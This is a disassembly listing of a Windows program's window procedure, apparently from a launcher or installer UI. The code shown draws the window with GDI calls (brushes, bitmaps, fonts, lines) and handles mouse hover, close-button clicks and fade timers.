   140002464:	48 bb 00 00 00 00 01 	movabs $0x100000000,%rbx
   14000246b:	00 00 00 
   14000246e:	48 8d 94 24 b0 00 00 	lea    0xb0(%rsp),%rdx
   140002475:	00 
   140002476:	4c 89 e1             	mov    %r12,%rcx
   140002479:	ff 15 21 56 07 00    	call   *0x75621(%rip)        # 140077aa0 <__imp_BeginPaint>
   14000247f:	48 89 c6             	mov    %rax,%rsi
   140002482:	48 8d 94 24 30 01 00 	lea    0x130(%rsp),%rdx
   140002489:	00 
   14000248a:	4c 89 a4 24 70 01 00 	mov    %r12,0x170(%rsp)
   140002491:	00 
   140002492:	4c 89 e1             	mov    %r12,%rcx
   140002495:	ff 15 4d 56 07 00    	call   *0x7564d(%rip)        # 140077ae8 <__imp_GetClientRect>
   14000249b:	48 89 f1             	mov    %rsi,%rcx
   14000249e:	ff 15 34 57 07 00    	call   *0x75734(%rip)        # 140077bd8 <__imp_CreateCompatibleDC>
   1400024a4:	48 89 c7             	mov    %rax,%rdi
   1400024a7:	8b 94 24 38 01 00 00 	mov    0x138(%rsp),%edx
   1400024ae:	44 8b 84 24 3c 01 00 	mov    0x13c(%rsp),%r8d
   1400024b5:	00 
   1400024b6:	48 89 b4 24 68 01 00 	mov    %rsi,0x168(%rsp)
   1400024bd:	00 
   1400024be:	48 89 f1             	mov    %rsi,%rcx
   1400024c1:	ff 15 09 57 07 00    	call   *0x75709(%rip)        # 140077bd0 <__imp_CreateCompatibleBitmap>
   1400024c7:	48 89 f9             	mov    %rdi,%rcx
   1400024ca:	48 89 84 24 60 01 00 	mov    %rax,0x160(%rsp)
   1400024d1:	00 
   1400024d2:	48 89 c2             	mov    %rax,%rdx
   1400024d5:	ff 15 5d 57 07 00    	call   *0x7575d(%rip)        # 140077c38 <__imp_SelectObject>
   1400024db:	48 89 84 24 58 01 00 	mov    %rax,0x158(%rsp)
   1400024e2:	00 
   1400024e3:	8b 2d 27 7c 07 00    	mov    0x77c27(%rip),%ebp        # 14007a110 <S_WND_W>
   1400024e9:	8b 35 25 7c 07 00    	mov    0x77c25(%rip),%esi        # 14007a114 <S_WND_H>
   1400024ef:	48 8b 05 42 7c 07 00 	mov    0x77c42(%rip),%rax        # 14007a138 <pfGF>
   1400024f6:	48 85 c0             	test   %rax,%rax
   1400024f9:	0f 84 43 01 00 00    	je     140002642 <MainProc+0x402>
   1400024ff:	48 89 9c 24 a0 00 00 	mov    %rbx,0xa0(%rsp)
   140002506:	00 
   140002507:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
   14000250e:	00 00 00 00 00 
   140002513:	48 b9 00 21 00 23 00 	movabs $0x280023002100,%rcx
   14000251a:	28 00 00 
   14000251d:	48 89 8c 24 88 00 00 	mov    %rcx,0x88(%rsp)
   140002524:	00 
   140002525:	89 ac 24 90 00 00 00 	mov    %ebp,0x90(%rsp)
   14000252c:	89 b4 24 94 00 00 00 	mov    %esi,0x94(%rsp)
   140002533:	48 b9 00 19 00 1a 00 	movabs $0x1e001a001900,%rcx
   14000253a:	1e 00 00 
   14000253d:	48 89 8c 24 98 00 00 	mov    %rcx,0x98(%rsp)
   140002544:	00 
   140002545:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   14000254c:	00 
   14000254d:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140002554:	00 
   140002555:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   14000255c:	00 
   14000255d:	4c 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%r9
   140002564:	00 
   140002565:	48 89 f9             	mov    %rdi,%rcx
   140002568:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000256e:	ff d0                	call   *%rax
   140002570:	e9 12 01 00 00       	jmp    140002687 <MainProc+0x447>
   140002575:	49 83 f8 01          	cmp    $0x1,%r8
   140002579:	0f 85 bb 00 00 00    	jne    14000263a <MainProc+0x3fa>
   14000257f:	8b 0d 7b 7b 07 00    	mov    0x77b7b(%rip),%ecx        # 14007a100 <g+0x58>
   140002585:	85 c9                	test   %ecx,%ecx
   140002587:	b8 ff 00 00 00       	mov    $0xff,%eax
   14000258c:	0f 44 c1             	cmove  %ecx,%eax
   14000258f:	8b 0d 73 7b 07 00    	mov    0x77b73(%rip),%ecx        # 14007a108 <g+0x60>
   140002595:	39 c1                	cmp    %eax,%ecx
   140002597:	0f 8d 68 02 00 00    	jge    140002805 <MainProc+0x5c5>
   14000259d:	81 f9 e9 00 00 00    	cmp    $0xe9,%ecx
   1400025a3:	ba e9 00 00 00       	mov    $0xe9,%edx
   1400025a8:	0f 4c d1             	cmovl  %ecx,%edx
   1400025ab:	83 c2 16             	add    $0x16,%edx
   1400025ae:	89 d1                	mov    %edx,%ecx
   1400025b0:	e9 5a 02 00 00       	jmp    14000280f <MainProc+0x5cf>
   1400025b5:	4c 89 c6             	mov    %r8,%rsi
   1400025b8:	41 0f bf d9          	movswl %r9w,%ebx
   1400025bc:	4d 89 ce             	mov    %r9,%r14
   1400025bf:	44 89 c8             	mov    %r9d,%eax
   1400025c2:	c1 f8 10             	sar    $0x10,%eax
   1400025c5:	48 c1 e0 20          	shl    $0x20,%rax
   1400025c9:	48 09 c3             	or     %rax,%rbx
   1400025cc:	48 8d 0d fd 7a 07 00 	lea    0x77afd(%rip),%rcx        # 14007a0d0 <g+0x28>
   1400025d3:	48 89 da             	mov    %rbx,%rdx
   1400025d6:	ff 15 74 55 07 00    	call   *0x75574(%rip)        # 140077b50 <__imp_PtInRect>
   1400025dc:	85 c0                	test   %eax,%eax
   1400025de:	0f 84 cf 01 00 00    	je     1400027b3 <MainProc+0x573>
   1400025e4:	45 31 f6             	xor    %r14d,%r14d
   1400025e7:	31 c9                	xor    %ecx,%ecx
   1400025e9:	ff 15 59 55 07 00    	call   *0x75559(%rip)        # 140077b48 <__imp_PostQuitMessage>
   1400025ef:	e9 b4 0c 00 00       	jmp    1400032a8 <MainProc+0x1068>
   1400025f4:	89 1d 06 7b 07 00    	mov    %ebx,0x77b06(%rip)        # 14007a100 <g+0x58>
   1400025fa:	ba 01 00 00 00       	mov    $0x1,%edx
   1400025ff:	4c 89 e1             	mov    %r12,%rcx
   140002602:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140002608:	45 31 c9             	xor    %r9d,%r9d
   14000260b:	ff 15 7f 55 07 00    	call   *0x7557f(%rip)        # 140077b90 <__imp_SetTimer>
   140002611:	3b 3d ed 7a 07 00    	cmp    0x77aed(%rip),%edi        # 14007a104 <g+0x5c>
   140002617:	74 06                	je     14000261f <MainProc+0x3df>
   140002619:	89 3d e5 7a 07 00    	mov    %edi,0x77ae5(%rip)        # 14007a104 <g+0x5c>
   14000261f:	4c 89 e1             	mov    %r12,%rcx
   140002622:	31 d2                	xor    %edx,%edx
   140002624:	45 31 c0             	xor    %r8d,%r8d
   140002627:	ff 15 eb 54 07 00    	call   *0x754eb(%rip)        # 140077b18 <__imp_InvalidateRect>
   14000262d:	83 3d d8 7a 07 00 00 	cmpl   $0x0,0x77ad8(%rip)        # 14007a10c <g+0x64>
   140002634:	0f 84 33 01 00 00    	je     14000276d <MainProc+0x52d>
   14000263a:	45 31 f6             	xor    %r14d,%r14d
   14000263d:	e9 66 0c 00 00       	jmp    1400032a8 <MainProc+0x1068>
   140002642:	b9 21 23 28 00       	mov    $0x282321,%ecx
   140002647:	ff 15 b3 55 07 00    	call   *0x755b3(%rip)        # 140077c00 <__imp_CreateSolidBrush>
   14000264d:	48 89 c3             	mov    %rax,%rbx
   140002650:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
   140002657:	00 00 00 00 00 
   14000265c:	89 ac 24 88 00 00 00 	mov    %ebp,0x88(%rsp)
   140002663:	89 b4 24 8c 00 00 00 	mov    %esi,0x8c(%rsp)
   14000266a:	48 8d 94 24 80 00 00 	lea    0x80(%rsp),%rdx
   140002671:	00 
   140002672:	48 89 f9             	mov    %rdi,%rcx
   140002675:	49 89 c0             	mov    %rax,%r8
   140002678:	ff 15 62 54 07 00    	call   *0x75462(%rip)        # 140077ae0 <__imp_FillRect>
   14000267e:	48 89 d9             	mov    %rbx,%rcx
   140002681:	ff 15 89 55 07 00    	call   *0x75589(%rip)        # 140077c10 <__imp_DeleteObject>
   140002687:	4c 8b 35 22 7a 07 00 	mov    0x77a22(%rip),%r14        # 14007a0b0 <g+0x8>
   14000268e:	4d 85 f6             	test   %r14,%r14
   140002691:	0f 84 fe 01 00 00    	je     140002895 <MainProc+0x655>
   140002697:	8b 35 2b 7a 07 00    	mov    0x77a2b(%rip),%esi        # 14007a0c8 <g+0x20>
   14000269d:	f3 0f 2a ce          	cvtsi2ss %esi,%xmm1
   1400026a1:	f3 0f 10 05 57 79 07 	movss  0x77957(%rip),%xmm0        # 14007a000 <g_dpiScale>
   1400026a8:	00 
   1400026a9:	f3 0f 59 c8          	mulss  %xmm0,%xmm1
   1400026ad:	44 8b 2d 18 7a 07 00 	mov    0x77a18(%rip),%r13d        # 14007a0cc <g+0x24>
   1400026b4:	f3 41 0f 2a d5       	cvtsi2ss %r13d,%xmm2
   1400026b9:	f3 0f 10 1d 1f 3a 00 	movss  0x3a1f(%rip),%xmm3        # 1400060e0 <.refptr._newmode+0x50>
   1400026c0:	00 
   1400026c1:	f3 0f 58 cb          	addss  %xmm3,%xmm1
   1400026c5:	f3 0f 59 d0          	mulss  %xmm0,%xmm2
   1400026c9:	f3 0f 58 d3          	addss  %xmm3,%xmm2
   1400026cd:	f3 0f 2c ea          	cvttss2si %xmm2,%ebp
   1400026d1:	8b 1d 41 7a 07 00    	mov    0x77a41(%rip),%ebx        # 14007a118 <S_TOP_BAR_H>
   1400026d7:	29 eb                	sub    %ebp,%ebx
   1400026d9:	79 0b                	jns    1400026e6 <MainProc+0x4a6>
   1400026db:	89 d8                	mov    %ebx,%eax
   1400026dd:	c1 e8 1f             	shr    $0x1f,%eax
   1400026e0:	01 d8                	add    %ebx,%eax
   1400026e2:	d1 f8                	sar    $1,%eax
   1400026e4:	89 c3                	mov    %eax,%ebx
   1400026e6:	f3 0f 2c c1          	cvttss2si %xmm1,%eax
   1400026ea:	89 44 24 78          	mov    %eax,0x78(%rsp)
   1400026ee:	f3 0f 59 05 ee 39 00 	mulss  0x39ee(%rip),%xmm0        # 1400060e4 <.refptr._newmode+0x54>
   1400026f5:	00 
   1400026f6:	f3 0f 58 05 e2 39 00 	addss  0x39e2(%rip),%xmm0        # 1400060e0 <.refptr._newmode+0x50>
   1400026fd:	00 
   1400026fe:	f3 44 0f 2c e0       	cvttss2si %xmm0,%r12d
   140002703:	48 89 f9             	mov    %rdi,%rcx
   140002706:	ff 15 cc 54 07 00    	call   *0x754cc(%rip)        # 140077bd8 <__imp_CreateCompatibleDC>
   14000270c:	49 89 c7             	mov    %rax,%r15
   14000270f:	48 89 c1             	mov    %rax,%rcx
   140002712:	4c 89 f2             	mov    %r14,%rdx
   140002715:	ff 15 1d 55 07 00    	call   *0x7551d(%rip)        # 140077c38 <__imp_SelectObject>
   14000271b:	49 89 c6             	mov    %rax,%r14
   14000271e:	48 8b 05 1b 7a 07 00 	mov    0x77a1b(%rip),%rax        # 14007a140 <pfAB>
   140002725:	48 85 c0             	test   %rax,%rax
   140002728:	0f 84 14 01 00 00    	je     140002842 <MainProc+0x602>
   14000272e:	44 89 6c 24 48       	mov    %r13d,0x48(%rsp)
   140002733:	89 74 24 40          	mov    %esi,0x40(%rsp)
   140002737:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   14000273c:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   140002740:	c7 44 24 50 00 00 ff 	movl   $0x1ff0000,0x50(%rsp)
   140002747:	01 
   140002748:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   14000274f:	00 
   140002750:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140002757:	00 
   140002758:	48 89 f9             	mov    %rdi,%rcx
   14000275b:	44 89 e2             	mov    %r12d,%edx
   14000275e:	41 89 d8             	mov    %ebx,%r8d
   140002761:	44 8b 4c 24 78       	mov    0x78(%rsp),%r9d
   140002766:	ff d0                	call   *%rax
   140002768:	e9 13 01 00 00       	jmp    140002880 <MainProc+0x640>
   14000276d:	48 b8 18 00 00 00 02 	movabs $0x200000018,%rax
   140002774:	00 00 00 
   140002777:	48 89 84 24 b0 00 00 	mov    %rax,0xb0(%rsp)
   14000277e:	00 
   14000277f:	4c 89 a4 24 b8 00 00 	mov    %r12,0xb8(%rsp)
   140002786:	00 
   140002787:	48 c7 84 24 c0 00 00 	movq   $0x0,0xc0(%rsp)
   14000278e:	00 00 00 00 00 
   140002793:	48 8d 8c 24 b0 00 00 	lea    0xb0(%rsp),%rcx
   14000279a:	00 
   14000279b:	ff 15 ff 53 07 00    	call   *0x753ff(%rip)        # 140077ba0 <__imp_TrackMouseEvent>
   1400027a1:	c7 05 61 79 07 00 01 	movl   $0x1,0x77961(%rip)        # 14007a10c <g+0x64>
   1400027a8:	00 00 00 
   1400027ab:	45 31 f6             	xor    %r14d,%r14d
   1400027ae:	e9 f5 0a 00 00       	jmp    1400032a8 <MainProc+0x1068>
   1400027b3:	48 8d 0d 26 79 07 00 	lea    0x77926(%rip),%rcx        # 14007a0e0 <g+0x38>
   1400027ba:	48 89 da             	mov    %rbx,%rdx
   1400027bd:	ff 15 8d 53 07 00    	call   *0x7538d(%rip)        # 140077b50 <__imp_PtInRect>
   1400027c3:	85 c0                	test   %eax,%eax
   1400027c5:	0f 84 8d 0a 00 00    	je     140003258 <MainProc+0x1018>
   1400027cb:	48 8b 3d d6 78 07 00 	mov    0x778d6(%rip),%rdi        # 14007a0a8 <g>
   1400027d2:	48 8b 0d 87 79 07 00 	mov    0x77987(%rip),%rcx        # 14007a160 <g_wv>
   1400027d9:	48 85 c9             	test   %rcx,%rcx
   1400027dc:	0f 84 14 09 00 00    	je     1400030f6 <MainProc+0xeb6>
   1400027e2:	ff 15 38 53 07 00    	call   *0x75338(%rip)        # 140077b20 <__imp_IsWindow>
   1400027e8:	85 c0                	test   %eax,%eax
   1400027ea:	0f 84 06 09 00 00    	je     1400030f6 <MainProc+0xeb6>
   1400027f0:	48 8b 0d 69 79 07 00 	mov    0x77969(%rip),%rcx        # 14007a160 <g_wv>
   1400027f7:	ff 15 8b 53 07 00    	call   *0x7538b(%rip)        # 140077b88 <__imp_SetForegroundWindow>
   1400027fd:	45 31 f6             	xor    %r14d,%r14d
   140002800:	e9 a3 0a 00 00       	jmp    1400032a8 <MainProc+0x1068>
   140002805:	76 0e                	jbe    140002815 <MainProc+0x5d5>
   140002807:	31 d2                	xor    %edx,%edx
   140002809:	83 e9 16             	sub    $0x16,%ecx
   14000280c:	0f 42 ca             	cmovb  %edx,%ecx
   14000280f:	89 0d f3 78 07 00    	mov    %ecx,0x778f3(%rip)        # 14007a108 <g+0x60>
   140002815:	39 c1                	cmp    %eax,%ecx
   140002817:	75 0e                	jne    140002827 <MainProc+0x5e7>
   140002819:	ba 01 00 00 00       	mov    $0x1,%edx
   14000281e:	4c 89 e1             	mov    %r12,%rcx
   140002821:	ff 15 01 53 07 00    	call   *0x75301(%rip)        # 140077b28 <__imp_KillTimer>
   140002827:	48 8d 15 a2 78 07 00 	lea    0x778a2(%rip),%rdx        # 14007a0d0 <g+0x28>
   14000282e:	45 31 f6             	xor    %r14d,%r14d
   140002831:	4c 89 e1             	mov    %r12,%rcx
   140002834:	45 31 c0             	xor    %r8d,%r8d
   140002837:	ff 15 db 52 07 00    	call   *0x752db(%rip)        # 140077b18 <__imp_InvalidateRect>
   14000283d:	e9 66 0a 00 00       	jmp    1400032a8 <MainProc+0x1068>
   140002842:	44 89 6c 24 48       	mov    %r13d,0x48(%rsp)
   140002847:	89 74 24 40          	mov    %esi,0x40(%rsp)
   14000284b:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   140002850:	89 6c 24 20          	mov    %ebp,0x20(%rsp)
   140002854:	c7 44 24 50 20 00 cc 	movl   $0xcc0020,0x50(%rsp)
   14000285b:	00 
   14000285c:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   140002863:	00 
   140002864:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   14000286b:	00 
   14000286c:	48 89 f9             	mov    %rdi,%rcx
   14000286f:	44 89 e2             	mov    %r12d,%edx
   140002872:	41 89 d8             	mov    %ebx,%r8d
   140002875:	44 8b 4c 24 78       	mov    0x78(%rsp),%r9d
   14000287a:	ff 15 d0 53 07 00    	call   *0x753d0(%rip)        # 140077c50 <__imp_StretchBlt>
   140002880:	4c 89 f9             	mov    %r15,%rcx
   140002883:	4c 89 f2             	mov    %r14,%rdx
   140002886:	ff 15 ac 53 07 00    	call   *0x753ac(%rip)        # 140077c38 <__imp_SelectObject>
   14000288c:	4c 89 f9             	mov    %r15,%rcx
   14000288f:	ff 15 73 53 07 00    	call   *0x75373(%rip)        # 140077c08 <__imp_DeleteDC>
   140002895:	8b 0d 6d 78 07 00    	mov    0x7786d(%rip),%ecx        # 14007a108 <g+0x60>
   14000289b:	85 c9                	test   %ecx,%ecx
   14000289d:	0f 8e a9 00 00 00    	jle    14000294c <MainProc+0x70c>
   1400028a3:	89 ca                	mov    %ecx,%edx
   1400028a5:	c1 e2 08             	shl    $0x8,%edx
   1400028a8:	29 ca                	sub    %ecx,%edx
   1400028aa:	b8 ff 00 00 00       	mov    $0xff,%eax
   1400028af:	29 c8                	sub    %ecx,%eax
   1400028b1:	89 c1                	mov    %eax,%ecx
   1400028b3:	c1 e1 05             	shl    $0x5,%ecx
   1400028b6:	01 c1                	add    %eax,%ecx
   1400028b8:	01 d1                	add    %edx,%ecx
   1400028ba:	48 63 c9             	movslq %ecx,%rcx
   1400028bd:	48 69 d1 81 80 80 80 	imul   $0xffffffff80808081,%rcx,%rdx
   1400028c4:	48 c1 ea 20          	shr    $0x20,%rdx
   1400028c8:	01 d1                	add    %edx,%ecx
   1400028ca:	89 ca                	mov    %ecx,%edx
   1400028cc:	c1 ea 1f             	shr    $0x1f,%edx
   1400028cf:	c1 e9 07             	shr    $0x7,%ecx
   1400028d2:	01 d1                	add    %edx,%ecx
   1400028d4:	0f b6 c9             	movzbl %cl,%ecx
   1400028d7:	6b d0 23             	imul   $0x23,%eax,%edx
   1400028da:	48 63 d2             	movslq %edx,%rdx
   1400028dd:	4c 69 c2 81 80 80 80 	imul   $0xffffffff80808081,%rdx,%r8
   1400028e4:	49 c1 e8 20          	shr    $0x20,%r8
   1400028e8:	44 01 c2             	add    %r8d,%edx
   1400028eb:	41 89 d0             	mov    %edx,%r8d
   1400028ee:	41 c1 e8 1f          	shr    $0x1f,%r8d
   1400028f2:	c1 ea 07             	shr    $0x7,%edx
   1400028f5:	44 01 c2             	add    %r8d,%edx
   1400028f8:	c1 e2 08             	shl    $0x8,%edx
   1400028fb:	0f b7 d2             	movzwl %dx,%edx
   1400028fe:	09 ca                	or     %ecx,%edx
   140002900:	c1 e0 03             	shl    $0x3,%eax
   140002903:	8d 04 80             	lea    (%rax,%rax,4),%eax
   140002906:	48 98                	cltq
   140002908:	48 69 c8 81 80 80 80 	imul   $0xffffffff80808081,%rax,%rcx
   14000290f:	48 c1 e9 20          	shr    $0x20,%rcx
   140002913:	01 c8                	add    %ecx,%eax
   140002915:	89 c1                	mov    %eax,%ecx
   140002917:	c1 e9 1f             	shr    $0x1f,%ecx
   14000291a:	c1 e8 07             	shr    $0x7,%eax
   14000291d:	01 c8                	add    %ecx,%eax
   14000291f:	0f b6 c8             	movzbl %al,%ecx
   140002922:	c1 e1 10             	shl    $0x10,%ecx
   140002925:	09 d1                	or     %edx,%ecx
   140002927:	ff 15 d3 52 07 00    	call   *0x752d3(%rip)        # 140077c00 <__imp_CreateSolidBrush>
   14000292d:	48 89 c3             	mov    %rax,%rbx
   140002930:	48 8d 15 99 77 07 00 	lea    0x77799(%rip),%rdx        # 14007a0d0 <g+0x28>
   140002937:	48 89 f9             	mov    %rdi,%rcx
   14000293a:	49 89 c0             	mov    %rax,%r8
   14000293d:	ff 15 9d 51 07 00    	call   *0x7519d(%rip)        # 140077ae0 <__imp_FillRect>
   140002943:	48 89 d9             	mov    %rbx,%rcx
   140002946:	ff 15 c4 52 07 00    	call   *0x752c4(%rip)        # 140077c10 <__imp_DeleteObject>
   14000294c:	83 3d ad 77 07 00 00 	cmpl   $0x0,0x777ad(%rip)        # 14007a100 <g+0x58>
   140002953:	b8 78 8a 91 00       	mov    $0x918a78,%eax
   140002958:	41 b8 ff ff ff 00    	mov    $0xffffff,%r8d
   14000295e:	44 0f 44 c0          	cmove  %eax,%r8d
   140002962:	f3 0f 10 05 96 76 07 	movss  0x77696(%rip),%xmm0        # 14007a000 <g_dpiScale>
   140002969:	00 
   14000296a:	f3 0f 58 c0          	addss  %xmm0,%xmm0
   14000296e:	f3 0f 10 35 6a 37 00 	movss  0x376a(%rip),%xmm6        # 1400060e0 <.refptr._newmode+0x50>
   140002975:	00 
   140002976:	f3 0f 58 c6          	addss  %xmm6,%xmm0
   14000297a:	f3 0f 2c d0          	cvttss2si %xmm0,%edx
   14000297e:	31 c9                	xor    %ecx,%ecx
   140002980:	ff 15 6a 52 07 00    	call   *0x7526a(%rip)        # 140077bf0 <__imp_CreatePen>
   140002986:	48 89 c3             	mov    %rax,%rbx
   140002989:	48 89 f9             	mov    %rdi,%rcx
   14000298c:	48 89 c2             	mov    %rax,%rdx
   14000298f:	ff 15 a3 52 07 00    	call   *0x752a3(%rip)        # 140077c38 <__imp_SelectObject>
   140002995:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   14000299a:	8b 05 38 77 07 00    	mov    0x77738(%rip),%eax        # 14007a0d8 <g+0x30>
   1400029a0:	03 05 2a 77 07 00    	add    0x7772a(%rip),%eax        # 14007a0d0 <g+0x28>
   1400029a6:	89 c6                	mov    %eax,%esi
   1400029a8:	c1 ee 1f             	shr    $0x1f,%esi
   1400029ab:	01 c6                	add    %eax,%esi
   1400029ad:	d1 fe                	sar    $1,%esi
   1400029af:	8b 05 27 77 07 00    	mov    0x77727(%rip),%eax        # 14007a0dc <g+0x34>
   1400029b5:	03 05 19 77 07 00    	add    0x77719(%rip),%eax        # 14007a0d4 <g+0x2c>
   1400029bb:	41 89 c5             	mov    %eax,%r13d
   1400029be:	41 c1 ed 1f          	shr    $0x1f,%r13d
   1400029c2:	41 01 c5             	add    %eax,%r13d
   1400029c5:	f3 0f 10 05 33 76 07 	movss  0x77633(%rip),%xmm0        # 14007a000 <g_dpiScale>
   1400029cc:	00 
   1400029cd:	f3 0f 59 05 13 37 00 	mulss  0x3713(%rip),%xmm0        # 1400060e8 <.refptr._newmode+0x58>
   1400029d4:	00 
   1400029d5:	41 d1 fd             	sar    $1,%r13d
   1400029d8:	f3 0f 58 c6          	addss  %xmm6,%xmm0
   1400029dc:	f3 44 0f 2c f0       	cvttss2si %xmm0,%r14d
   1400029e1:	89 f5                	mov    %esi,%ebp
   1400029e3:	44 29 f5             	sub    %r14d,%ebp
   1400029e6:	45 89 ef             	mov    %r13d,%r15d
   1400029e9:	45 29 f7             	sub    %r14d,%r15d
   1400029ec:	48 89 f9             	mov    %rdi,%rcx
   1400029ef:	89 ea                	mov    %ebp,%edx
   1400029f1:	45 89 f8             	mov    %r15d,%r8d
   1400029f4:	45 31 c9             	xor    %r9d,%r9d
   1400029f7:	ff 15 2b 52 07 00    	call   *0x7522b(%rip)        # 140077c28 <__imp_MoveToEx>
   1400029fd:	46 8d 24 36          	lea    (%rsi,%r14,1),%r12d
   140002a01:	42 8d 14 36          	lea    (%rsi,%r14,1),%edx
   140002a05:	ff c2                	inc    %edx
   140002a07:	47 8d 6c 35 01       	lea    0x1(%r13,%r14,1),%r13d
   140002a0c:	48 8b 35 0d 52 07 00 	mov    0x7520d(%rip),%rsi        # 140077c20 <__imp_LineTo>
   140002a13:	48 89 f9             	mov    %rdi,%rcx
   140002a16:	45 89 e8             	mov    %r13d,%r8d
   140002a19:	ff d6                	call   *%rsi
   140002a1b:	48 89 f9             	mov    %rdi,%rcx
   140002a1e:	44 89 e2             	mov    %r12d,%edx
   140002a21:	45 89 f8             	mov    %r15d,%r8d
   140002a24:	45 31 c9             	xor    %r9d,%r9d
   140002a27:	ff 15 fb 51 07 00    	call   *0x751fb(%rip)        # 140077c28 <__imp_MoveToEx>
   140002a2d:	ff cd                	dec    %ebp
   140002a2f:	48 89 f9             	mov    %rdi,%rcx
   140002a32:	89 ea                	mov    %ebp,%edx
   140002a34:	45 89 e8             	mov    %r13d,%r8d
   140002a37:	ff d6                	call   *%rsi
   140002a39:	48 89 f9             	mov    %rdi,%rcx
   140002a3c:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   140002a41:	4c 8b 35 f0 51 07 00 	mov    0x751f0(%rip),%r14        # 140077c38 <__imp_SelectObject>
   140002a48:	41 ff d6             	call   *%r14
   140002a4b:	48 89 d9             	mov    %rbx,%rcx
   140002a4e:	ff 15 bc 51 07 00    	call   *0x751bc(%rip)        # 140077c10 <__imp_DeleteObject>
   140002a54:	48 89 f9             	mov    %rdi,%rcx
   140002a57:	ba 01 00 00 00       	mov    $0x1,%edx
   140002a5c:	ff 15 de 51 07 00    	call   *0x751de(%rip)        # 140077c40 <__imp_SetBkMode>
   140002a62:	f3 0f 10 05 96 75 07 	movss  0x77596(%rip),%xmm0        # 14007a000 <g_dpiScale>
   140002a69:	00 
   140002a6a:	f3 0f 59 05 7a 36 00 	mulss  0x367a(%rip),%xmm0        # 1400060ec <.refptr._newmode+0x5c>
   140002a71:	00 
   140002a72:	f3 0f 58 c6          	addss  %xmm6,%xmm0
   140002a76:	f3 0f 2c c8          	cvttss2si %xmm0,%ecx
   140002a7a:	f7 d9                	neg    %ecx
   140002a7c:	48 8d 1d f7 ff 06 00 	lea    0x6fff7(%rip),%rbx        # 140072a7a <enc_runtimes_zip+0x3414a>
   140002a83:	48 89 5c 24 68       	mov    %rbx,0x68(%rsp)
   140002a88:	c7 44 24 60 20 00 00 	movl   $0x20,0x60(%rsp)
   140002a8f:	00 
   140002a90:	c7 44 24 58 05 00 00 	movl   $0x5,0x58(%rsp)
   140002a97:	00 
   140002a98:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   140002a9f:	00 
   140002aa0:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   140002aa7:	00 
   140002aa8:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   140002aaf:	00 
   140002ab0:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   140002ab7:	00 
   140002ab8:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140002abf:	00 
   140002ac0:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140002ac7:	00 
   140002ac8:	c7 44 24 20 bc 02 00 	movl   $0x2bc,0x20(%rsp)
   140002acf:	00 
   140002ad0:	48 8b 35 11 51 07 00 	mov    0x75111(%rip),%rsi        # 140077be8 <__imp_CreateFontW>
   140002ad7:	31 d2                	xor    %edx,%edx
   140002ad9:	45 31 c0             	xor    %r8d,%r8d
   140002adc:	45 31 c9             	xor    %r9d,%r9d
   140002adf:	ff d6                	call   *%rsi
   140002ae1:	49 89 c4             	mov    %rax,%r12
   140002ae4:	f3 0f 10 05 14 75 07 	movss  0x77514(%rip),%xmm0        # 14007a000 <g_dpiScale>
   140002aeb:	00 
   140002aec:	f3 0f 59 05 fc 35 00 	mulss  0x35fc(%rip),%xmm0        # 1400060f0 <.refptr._newmode+0x60>
   140002af3:	00 
   140002af4:	f3 0f 58 c6          	addss  %xmm6,%xmm0
   140002af8:	f3 0f 2c c8          	cvttss2si %xmm0,%ecx
   140002afc:	f7 d9                	neg    %ecx
   140002afe:	48 89 5c 24 68       	mov    %rbx,0x68(%rsp)
   140002b03:	c7 44 24 60 20 00 00 	movl   $0x20,0x60(%rsp)
   140002b0a:	00 
   140002b0b:	c7 44 24 58 05 00 00 	movl   $0x5,0x58(%rsp)
   140002b12:	00 
   140002b13:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   140002b1a:	00 
   140002b1b:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   140002b22:	00 
   140002b23:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   140002b2a:	00 
   140002b2b:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   140002b32:	00 
   140002b33:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140002b3a:	00 
   140002b3b:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   140002b42:	00 
   140002b43:	c7 44 24 20 90 01 00 	movl   $0x190,0x20(%rsp)
   140002b4a:	00 
   140002b4b:	31 d2                	xor    %edx,%edx
   140002b4d:	45 31 c0             	xor    %r8d,%r8d
   140002b50:	45 31 c9             	xor    %r9d,%r9d
   140002b53:	ff d6                	call   *%rsi
   140002b55:	49 89 c7             	mov    %rax,%r15
   140002b58:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   140002b5d:	f3 0f 10 05 9b 74 07 	movss  0x7749b(%rip),%xmm0        # 14007a000 <g_dpiScale>
   140002b64:	00 
   140002b65:	f3 0f 59 05 87 35 00 	mulss  0x3587(%rip),%xmm0        # 1400060f4 <.refptr._newmode+0x64>
   140002b6c:	00 
   140002b6d:	f3 0f 58 c6          	addss  %xmm6,%xmm0
   140002b71:	f3 0f 2c c8          	cvttss2si %xmm0,%ecx
   140002b75:	f7 d9                	neg    %ecx
   140002b77:	48 89 5c 24 68       	mov    %rbx,0x68(%rsp)
